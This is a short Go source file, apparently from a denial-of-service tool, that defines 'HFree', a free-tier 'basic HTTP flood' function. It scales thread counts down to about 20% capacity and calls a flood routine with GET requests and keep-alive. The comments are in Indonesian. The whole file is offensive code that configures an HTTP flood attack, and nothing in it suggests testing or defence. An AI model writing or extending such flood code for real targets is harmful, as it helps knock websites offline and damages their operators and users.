package tactics

import "context"

// HFree — basic HTTP flood, ~20% power (dibatasi threads & rate).
func HFree(ctx context.Context, p Params) (int64, error) {
	p = withDefaults(p)
	if p.Threads > 20 {
		p.Threads = p.Threads / 5 // ~20% kapasitas
	}
	if p.Threads < 1 {
		p.Threads = 1
	}
	cfg := floodConfig{
		httpMethod: "GET",
		keepAlive:  true,
		rateLimit:  0,
	}
	return runFlood(ctx, p, cfg)
}
